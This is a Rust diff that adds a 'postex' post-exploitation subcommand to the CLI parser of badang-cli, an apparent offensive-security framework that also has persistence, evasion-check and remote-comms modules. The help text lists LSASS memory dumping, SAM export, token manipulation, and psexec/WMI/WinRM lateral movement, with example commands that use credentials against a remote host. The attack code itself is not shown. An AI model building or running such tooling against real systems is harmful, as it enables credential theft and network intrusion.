@@ -51,6 +51,14 @@ pub struct CLI {
     pub comms_use_sleep_obfs: bool,
     pub loader_check: String,
     pub loader_action: String,
+    pub postex_module: String,
+    pub postex_remote: String,
+    pub postex_output: String,
+    pub postex_username: String,
+    pub postex_password: String,
+    pub postex_command: String,
+    pub postex_service: String,
+    pub postex_payload: String,
 }
 
 impl CLI {
@@ -104,6 +112,14 @@ impl CLI {
             comms_use_sleep_obfs: false,
             loader_check: String::from("all"),
             loader_action: String::from("report"),
+            postex_module: String::new(),
+            postex_remote: String::new(),
+            postex_output: String::new(),
+            postex_username: String::new(),
+            postex_password: String::new(),
+            postex_command: String::new(),
+            postex_service: String::new(),
+            postex_payload: String::new(),
         };
 
         let mut i = 1;
@@ -185,6 +201,7 @@ impl CLI {
                 "persist" => cli.command = String::from("persist"),
                 "comms" => cli.command = String::from("comms"),
                 "loader" => cli.command = String::from("loader"),
+                "postex" => cli.command = String::from("postex"),
                 "--parent" => {
                     i += 1;
                     if i < args.len() {
@@ -386,6 +403,54 @@ impl CLI {
                         cli.loader_action = args[i].clone();
                     }
                 }
+                "--module" => {
+                    i += 1;
+                    if i < args.len() {
+                        cli.postex_module = args[i].clone();
+                    }
+                }
+                "--remote" => {
+                    i += 1;
+                    if i < args.len() {
+                        cli.postex_remote = args[i].clone();
+                    }
+                }
+                "--postex-output" => {
+                    i += 1;
+                    if i < args.len() {
+                        cli.postex_output = args[i].clone();
+                    }
+                }
+                "--postex-user" => {
+                    i += 1;
+                    if i < args.len() {
+                        cli.postex_username = args[i].clone();
+                    }
+                }
+                "--postex-pass" => {
+                    i += 1;
+                    if i < args.len() {
+                        cli.postex_password = args[i].clone();
+                    }
+                }
+                "--postex-cmd" => {
+                    i += 1;
+                    if i < args.len() {
+                        cli.postex_command = args[i].clone();
+                    }
+                }
+                "--postex-service" => {
+                    i += 1;
+                    if i < args.len() {
+                        cli.postex_service = args[i].clone();
+                    }
+                }
+                "--postex-payload" => {
+                    i += 1;
+                    if i < args.len() {
+                        cli.postex_payload = args[i].clone();
+                    }
+                }
                 _ => {
                     eprintln!("Unknown argument: {}", args[i]);
                     print_help();
@@ -429,6 +494,19 @@ impl CLI {
             process::exit(1);
         }
 
+        // Module is required for postex command
+        if cli.command == "postex" && !cli.dry_run && cli.postex_module.is_empty() {
+            eprintln!("ERROR: --module is required for postex command.");
+            eprintln!("Modules: lsass, sam, token, psexec, wmi, winrm");
+            process::exit(1);
+        }
+        if cli.command == "postex" && !cli.postex_module.is_empty() {
+            if let Err(e) = crate::postex::PostExModule::from_str(&cli.postex_module) {
+                eprintln!("ERROR: {}", e);
+                process::exit(1);
+            }
+        }
+
         // Check category is required for loader command
         if cli.command == "loader"
             && crate::loader::CheckCategory::from_str(&cli.loader_check).is_none()
@@ -470,6 +548,7 @@ fn print_help() {
     println!("  persist    Persistence configuration module");
     println!("  comms      Remote communication channel");
     println!("  loader     Pre-execution environment checks");
+    println!("  postex     Post-exploitation modules");
     println!();
     println!("OPTIONS:");
     println!("  -p, --pid <PID>       Target process ID (required)");
@@ -606,6 +685,24 @@ fn print_help() {
     println!("LOADER OPTIONS:");
     println!("  --check <CATEGORY>   Check category: sandbox, debug, vm, all (default: all)");
     println!("  --action <ACTION>    On detection: report, exit (default: report)");
+    println!();
+    println!("POST-EXPLOITATION OPTIONS:");
+    println!("  --module <MODULE>    Module: lsass, sam, token, psexec, wmi, winrm");
+    println!("  --remote <HOST>      Remote target host (lateral movement)");
+    println!("  --postex-output <P>  Output path (memory snapshot / registry export)");
+    println!("  --postex-user <USER> Remote credentials username");
+    println!("  --postex-pass <PASS> Remote credentials password");
+    println!("  --postex-cmd <CMD>   Remote command to execute (wmi/winrm)");
+    println!("  --postex-service <N> Service name (psexec, default: BadangSvc)");
+    println!("  --postex-payload <P> Payload path to copy (psexec)");
+    println!();
+    println!("POST-EXPLOITATION EXAMPLES:");
+    println!("  badang-cli postex --module lsass --pid 672 --postex-output dump.bin -x -c");
+    println!("  badang-cli postex --module sam --postex-output C:\\\\Temp -x -c");
+    println!("  badang-cli postex --module token --pid 672 -x -c");
+    println!("  badang-cli postex --module psexec --remote 10.0.0.5 --postex-user admin --postex-pass pass --postex-payload svc.exe -x -c");
+    println!("  badang-cli postex --module wmi --remote 10.0.0.5 --postex-cmd \"cmd /c whoami\" -x -c");
+    println!("  badang-cli postex --module winrm --remote 10.0.0.5 --postex-cmd \"hostname\" -x -c");
     println!();
     println!("LOADER EXAMPLES:");
     println!("  badang-cli loader --check all -x -c");
